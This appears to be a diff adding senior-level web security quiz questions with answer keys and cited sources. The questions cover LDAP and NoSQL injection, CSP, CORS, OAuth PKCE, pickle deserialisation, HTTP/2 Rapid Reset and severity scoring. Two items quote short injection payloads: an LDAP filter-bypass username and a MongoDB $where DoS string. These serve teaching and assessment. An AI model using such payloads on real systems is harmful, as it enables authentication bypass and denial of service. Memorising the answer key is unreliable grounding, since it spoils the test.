+    distractorRationale: { 1: 'XSW is signature wrapping.', 2: 'No memory corruption involved.', 3: 'ARP is L2.' },
+    source: { name: 'OWASP — Testing for XPath Injection', url: 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection' },
+  },
+
+  {
+    id: 'web-061', topic: 'web', subtopic: 'ldap-injection', difficulty: 'senior',
+    question: 'An LDAP-based login forms the filter as `(&(uid=$user)(userPassword=$pass))`. A user submits `*)(uid=*))(|(uid=*` as username. What does this enable?',
+    choices: ['LDAP filter injection — closing the original filter and injecting attacker-controlled clauses, often allowing authentication bypass. Mitigation: use parameterised LDAP APIs (e.g., escape per RFC 4515) and avoid concatenation', 'A CSRF', 'A clickjacking', 'A SQL injection'],
+    correctIndex: 0,
+    explanation: 'LDAP injection is the LDAP-side analogue of SQLi. The OWASP testing guide and OWASP LDAP Injection Prevention Cheat Sheet describe detection and proper parameterisation.',
+    distractorRationale: { 1: 'CSRF is request forgery.', 2: 'Clickjacking is iframe-based.', 3: 'SQLi targets relational DBs.' },
+    source: { name: 'OWASP LDAP Injection Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html' },
+  },
+
+  {
+    id: 'web-062', topic: 'web', subtopic: 'nosql-where-injection', difficulty: 'senior',
+    question: 'A MongoDB query passes user input into `$where: "this.username == \'" + user + "\'"`. What attack succeeds and what is the fix?',
+    choices: ['JavaScript injection inside $where, since the operator evaluates server-side JS — `\'; while(1){}; //` causes DoS, and arbitrary expressions can leak data. Mitigation: avoid $where entirely; use direct field equality with `db.users.findOne({username: user})`', 'A path traversal', 'A clickjacking', 'A subdomain takeover'],
+    correctIndex: 0,
+    explanation: 'MongoDB\'s $where executes the supplied JS expression in the database\'s scripting context. PortSwigger and MongoDB official guidance both flag this as high-risk and discourage use of $where entirely.',
+    distractorRationale: { 1: 'Traversal is filesystem.', 2: 'Clickjacking is iframe.', 3: 'Subdomain takeover is DNS.' },
+    source: { name: 'MongoDB — $where operator security note', url: 'https://www.mongodb.com/docs/manual/reference/operator/query/where/' },
+  },
+
+  {
+    id: 'web-063', topic: 'web', subtopic: 'csp-strict-dynamic', difficulty: 'senior',
+    question: 'Google\'s "strict CSP" recommendation is which policy shape?',
+    choices: ['`script-src \'nonce-...\' \'strict-dynamic\' \'unsafe-inline\' http: https:` — using a per-request nonce plus `strict-dynamic` so any script trusted by a nonce can load further scripts; `unsafe-inline` and HTTP fallbacks are present for legacy browsers but ignored by modern ones when nonce is present', 'Disable CSP entirely', 'Use Content-Type only', 'Use frame-options instead'],
+    correctIndex: 0,
+    explanation: 'csp-evaluator.withgoogle.com recommends nonce + strict-dynamic as the most robust modern policy. Older directives become inert when modern keywords are present, providing graceful degradation. OWASP\'s CSP cheat sheet aligns with this guidance.',
+    distractorRationale: { 1: 'Disabling CSP removes the control.', 2: 'Content-Type is unrelated to script policy.', 3: 'frame-options handles framing, not scripts.' },
+    source: { name: 'OWASP Content Security Policy Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html' },
+  },
+
+  {
+    id: 'web-064', topic: 'web', subtopic: 'sri', difficulty: 'senior',
+    question: 'You serve a JS bundle from a third-party CDN. What HTML attribute mitigates a CDN compromise?',
+    choices: ['`integrity="sha384-..."` (Subresource Integrity) on the `<script>` tag — browsers verify the fetched bundle\'s hash matches and refuse to execute mismatched content. Pair with `crossorigin="anonymous"`', 'rel="noopener"', 'sandbox', 'referrerpolicy'],
+    correctIndex: 0,
+    explanation: 'SRI provides a tampering-detection guarantee on third-party resources. Used widely on font/script CDNs. MDN and the W3C SRI spec describe the syntax and the required CORS attributes.',
+    distractorRationale: { 1: 'noopener is for window.opener safety.', 2: 'sandbox is iframe-specific.', 3: 'referrerpolicy controls Referer.' },
+    source: { name: 'MDN — Subresource Integrity', url: 'https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity' },
+  },
+
+  {
+    id: 'web-065', topic: 'web', subtopic: 'cors-null-origin', difficulty: 'senior',
+    question: 'An API responds with `Access-Control-Allow-Origin: null` and `Allow-Credentials: true`. Why is `null` a problematic origin to trust?',
+    choices: ['Several browser contexts (data: URLs, sandboxed iframes, file://) produce a `null` Origin, so any attacker who can render in such a context can claim Origin: null and access credentialed responses', 'It is the default safe value', 'It is reserved by the spec to mean same-origin', 'It is treated as 127.0.0.1'],
+    correctIndex: 0,
+    explanation: '`null` Origin is produced by sandboxed iframes (`<iframe sandbox>`), data: URLs, redirected fetches, and some other contexts. Trusting it for credentialed responses lets an attacker abuse a sandboxed iframe to act as an authorised origin. PortSwigger and OWASP CORS cheat sheet flag this.',
+    distractorRationale: { 1: 'It is not a default value.', 2: 'Same-origin is the matching scheme/host/port.', 3: 'It is not 127.0.0.1.' },
+    source: { name: 'PortSwigger Web Security Academy — CORS (null origin)', url: 'https://portswigger.net/web-security/cors' },
+  },
+
+  {
+    id: 'web-066', topic: 'web', subtopic: 'jsonp-risks', difficulty: 'senior',
+    question: 'JSONP endpoints persist on legacy APIs. What is the senior framing of their security posture?',
+    choices: ['JSONP returns executable JavaScript; once embedded via `<script src=...>`, the response runs in the embedding origin\'s context. JSONP endpoints leak any data they expose to any origin that loads them, and act as gadgets for CSP bypass when their origin is on a script-src allow-list. Recommendation: deprecate JSONP, use CORS', 'JSONP is more secure than fetch()', 'JSONP enforces SameSite', 'JSONP requires WebAuthn'],
+    correctIndex: 0,
+    explanation: 'JSONP\'s security is "data is published as code", which contradicts the SOP for sensitive data. CORS is the modern alternative. OWASP\'s deprecated controls page and many CSP-bypass papers reference JSONP.',
+    distractorRationale: { 1: 'fetch + CORS is more secure.', 2: 'SameSite is a cookie property.', 3: 'WebAuthn is unrelated.' },
+    source: { name: 'OWASP — JSONP and JSON Hijacking guidance', url: 'https://owasp.org/www-community/attacks/JSON_Hijacking' },
+  },
+
+  {
+    id: 'web-067', topic: 'web', subtopic: 'webauthn', difficulty: 'senior',
+    question: 'WebAuthn / FIDO2 protects against phishing because of which property?',
+    choices: ['The signed assertion is bound to the verifying server\'s origin (the relying party ID). Even if the user is tricked into typing on attacker.com, the authenticator refuses to sign because the origin does not match — phishing-resistant by design', 'It uses 6-digit OTPs', 'It uses static passwords', 'It runs over UDP'],
+    correctIndex: 0,
+    explanation: 'WebAuthn\'s phishing resistance comes from origin binding: the browser passes the validated origin to the authenticator, and the authenticator scopes its signed response to that origin. A phishing site cannot forge this. The W3C WebAuthn spec and FIDO Alliance materials describe the model.',
+    distractorRationale: { 1: 'OTPs are not phishing-resistant.', 2: 'Static passwords are highly phishable.', 3: 'WebAuthn is over HTTPS, not UDP.' },
+    source: { name: 'W3C — Web Authentication: An API for accessing Public Key Credentials', url: 'https://www.w3.org/TR/webauthn-2/' },
+  },
+
+  {
+    id: 'web-068', topic: 'web', subtopic: 'pkce', difficulty: 'senior',
+    question: 'OAuth 2.0 public clients (mobile/SPA) must use PKCE. Which problem does PKCE specifically solve?',
+    choices: ['Authorisation code interception — the attacker who intercepts the code (e.g., via a malicious app on the device) cannot exchange it for a token without the original code_verifier known only to the legitimate client. PKCE adds a verifier-bound exchange step', 'It encrypts the access token', 'It rotates client secrets', 'It enforces TLS'],
+    correctIndex: 0,
+    explanation: 'RFC 7636 (PKCE) prevents authorisation-code interception attacks against public clients that cannot store a client secret safely. The verifier/code_challenge mechanism binds the code to the client that initiated the flow.',
+    distractorRationale: { 1: 'Token encryption is separate.', 2: 'Public clients have no client secret.', 3: 'TLS is independent.' },
+    source: { name: 'IETF RFC 7636 — Proof Key for Code Exchange', url: 'https://datatracker.ietf.org/doc/html/rfc7636' },
+  },
+
+  {
+    id: 'web-069', topic: 'web', subtopic: 'python-pickle', difficulty: 'senior',
+    question: 'A Python web app deserialises data using `pickle.loads()` from user-controlled input. What is the senior writeup?',
+    choices: ['pickle is unsafe for untrusted data — `__reduce__` lets a serialised object define arbitrary code to run on deserialisation, yielding RCE. Recommendation: use safe formats (JSON, MessagePack) for untrusted input; pickle should only be used with trusted sources, ideally with cryptographic signing', 'pickle.loads is safe by default', 'pickle requires HTTPS', 'pickle uses XML'],
+    correctIndex: 0,
+    explanation: 'Python\'s pickle module is documented as unsafe for untrusted data. Many real-world RCEs (Celery, ML model loaders) trace back to pickle on attacker input. The Python docs explicitly warn against this use.',
+    distractorRationale: { 1: 'pickle.loads is explicitly unsafe.', 2: 'Transport is irrelevant.', 3: 'pickle is binary, not XML.' },
+    source: { name: 'Python documentation — pickle (security warning)', url: 'https://docs.python.org/3/library/pickle.html' },
+  },
+
+  {
+    id: 'web-070', topic: 'web', subtopic: 'reflected-fd', difficulty: 'senior',
+    question: 'Reflected File Download (RFD) is a class of attack where:',
+    choices: ['Trusted domains serve attacker-controlled content with a forced filename (via Content-Disposition or URL path tricks); the user double-clicks the downloaded file and runs malicious commands appearing to come from the trusted domain. Defence: strict Content-Disposition with filename; sanitise reflected content; never rely on filename from URL', 'A CSRF on file upload', 'An XXE in OOXML', 'A buffer overflow in PDFs'],
+    correctIndex: 0,
+    explanation: 'RFD was popularised by Oren Hafif (BlackHat 2014). Trusted-origin downloads of attacker-controlled content can deceive users into trusting the file. Mitigations are documented in OWASP and various vendor advisories.',
+    distractorRationale: { 1: 'CSRF is request forgery.', 2: 'XXE is XML external entities.', 3: 'PDF overflow is a parser bug.' },
+    source: { name: 'Oren Hafif — Reflected File Download research / OWASP RFD reference', url: 'https://owasp.org/www-community/vulnerabilities/Reflected_File_Download' },
+  },
+
+  {
+    id: 'web-071', topic: 'web', subtopic: 'samesite-modes', difficulty: 'senior',
+    question: 'Browsers default many cookies to `SameSite=Lax` if the attribute is unset. What is the difference between `Lax` and `Strict` for a session cookie?',
+    choices: ['Lax sends the cookie on top-level GET navigations from external sites; Strict never sends the cookie on cross-site requests at all. For high-value flows (banking), Strict is preferred — the user may need to re-login when arriving from a search result, but the cross-site CSRF surface is zero', 'They are identical', 'Strict allows all subresource requests', 'Lax disables HttpOnly'],
+    correctIndex: 0,
+    explanation: 'SameSite=Strict eliminates cross-site cookie attachment entirely. Lax preserves usability by allowing top-level GET navigations. RFC6265bis and MDN document the modes; OWASP recommends choosing per-flow risk.',
+    distractorRationale: { 1: 'They differ.', 2: 'Strict actually blocks more requests.', 3: 'HttpOnly is independent.' },
+    source: { name: 'MDN — Set-Cookie (SameSite)', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value' },
+  },
+
+  {
+    id: 'web-072', topic: 'web', subtopic: 'http2-rapid-reset', difficulty: 'senior',
+    question: 'CVE-2023-44487 (HTTP/2 Rapid Reset) is which kind of attack?',
+    choices: ['A DoS leveraging the HTTP/2 protocol\'s stream cancellation: an attacker opens many streams and cancels them rapidly, causing extreme server-side resource use without paying network cost. Mitigations are server patches and tuning maximum concurrent streams / cancellation rates', 'A SQL injection', 'A CSRF', 'An XSS'],
+    correctIndex: 0,
+    explanation: 'Rapid Reset abused HTTP/2\'s asymmetric cost: cheap cancellations vs expensive server-side stream setup. Cloudflare, AWS and Google detailed the technique in joint disclosures and pushed protocol-level mitigations.',
+    distractorRationale: { 1: 'Not a DB injection.', 2: 'Not request forgery.', 3: 'Not a script execution issue.' },
+    source: { name: 'Cloudflare — HTTP/2 Rapid Reset disclosure (CVE-2023-44487)', url: 'https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/' },
+  },
+
+  {
+    id: 'web-073', topic: 'web', subtopic: 'api-bola', difficulty: 'senior',
+    question: 'Which OWASP API Security Top 10 category covers the case where any authenticated user can access another user\'s object by changing the ID in the URL?',
+    choices: ['API1:2023 — Broken Object Level Authorization (BOLA), the API equivalent of IDOR. The Top 10 lists it as the most prevalent and high-impact API issue', 'API3 — Mass Assignment', 'API8 — Security Misconfiguration', 'API10 — Unsafe Consumption of APIs'],
+    correctIndex: 0,
+    explanation: 'OWASP API Security Top 10 places BOLA at #1. The category combines what was traditionally called IDOR with the typical API-shaped resource access pattern.',
+    distractorRationale: { 1: 'API3 covers binding/over-posting issues.', 2: 'API8 is hardening.', 3: 'API10 covers risks consuming third-party APIs.' },
+    source: { name: 'OWASP API Security Top 10 — API1:2023 BOLA', url: 'https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/' },
+  },
+
+  {
+    id: 'web-074', topic: 'web', subtopic: 'cwe', difficulty: 'senior',
+    question: 'A senior pentester is asked to map a finding to a standard weakness identifier. Which standard provides numeric IDs (CWE-79 for XSS, CWE-89 for SQLi, etc.) and is referenced by NVD CVEs?',
+    choices: ['MITRE\'s Common Weakness Enumeration (CWE) — used by NVD/CVE entries to classify the underlying weakness type. Senior reports often cite CWE alongside CVSS for clear, vendor-neutral categorisation', 'OWASP Top 10 only', 'PCI DSS only', 'NIST CSF only'],
+    correctIndex: 0,
+    explanation: 'CWE is the canonical weakness taxonomy. NVD links CVEs to CWE IDs. The CWE Top 25 is also a widely-referenced list. OWASP, PCI, and NIST CSF are different abstraction levels.',
+    distractorRationale: { 1: 'Top 10 is awareness, not numeric weaknesses.', 2: 'PCI DSS is a compliance standard.', 3: 'NIST CSF is a framework.' },
+    source: { name: 'MITRE — Common Weakness Enumeration (CWE)', url: 'https://cwe.mitre.org/' },
+  },
+
+  {
+    id: 'web-075', topic: 'web', subtopic: 'cvss', difficulty: 'senior',
+    question: 'A vulnerability has CVSS 3.1 Base 8.1 (High) but Environmental score 5.4 (Medium) due to mitigating context. Which value should a senior pentester emphasise in the executive summary?',
+    choices: ['Both — Base reflects the inherent severity, Environmental reflects the actual risk in this client\'s context. Reporting only one hides part of the picture; reporting both with brief explanation lets stakeholders compare against industry baselines and prioritise locally', 'Only Base; Environmental is for vendors', 'Only Environmental; Base is academic', 'Only the temporal score'],
+    correctIndex: 0,
+    explanation: 'FIRST.org\'s CVSS 3.1 specification documents the three metric groups (Base/Temporal/Environmental). Senior reports communicate inherent vs contextual severity to drive prioritisation discussions.',
+    distractorRationale: { 1: 'Environmental is for any consumer.', 2: 'Base is industry comparable.', 3: 'Temporal alone misses environment.' },
+    source: { name: 'FIRST — Common Vulnerability Scoring System v3.1 Specification', url: 'https://www.first.org/cvss/v3.1/specification-document' },
+  },
 ];
